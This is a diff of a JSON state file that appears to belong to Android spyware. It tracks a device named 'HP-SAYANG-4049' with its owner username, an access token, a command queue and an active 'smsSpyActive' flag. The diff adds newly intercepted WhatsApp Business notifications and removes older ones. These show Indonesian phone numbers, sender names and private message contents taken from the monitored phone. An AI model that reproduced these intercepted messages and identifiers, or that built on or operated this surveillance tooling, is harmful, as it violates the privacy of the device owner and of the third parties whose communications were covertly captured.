@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775634047023,
+    "lastSeen": 1775634050121,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎3 pesan dari 2 chat",
+        "time": "08/04 14:40",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634052277
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎2 pesan dari 2 chat",
+        "time": "08/04 14:40",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634050725
+      },
+      {
+        "appName": "WA Business",
+        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏: Membalas Anda",
+        "content": "~ 𝖅𝕽𝕴𝕷𝖅 ℌ𝔒𝔖𝔗: Ezz",
+        "time": "08/04 14:40",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634050649
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Sbar",
+        "time": "08/04 14:40",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634049952
+      },
       {
         "appName": "WA Business",
         "sender": "+62 898-7564-441",
@@ -4294,38 +4326,6 @@
         "time": "08/04 14:24",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633071600
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "Permisi Azx",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633069901
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎20 pesan dari 3 chat",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633069896
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎19 pesan dari 3 chat",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633069094
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "📡 Undangan admin saluran",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633069044
       }
     ],
     "galleryPhotos": [],
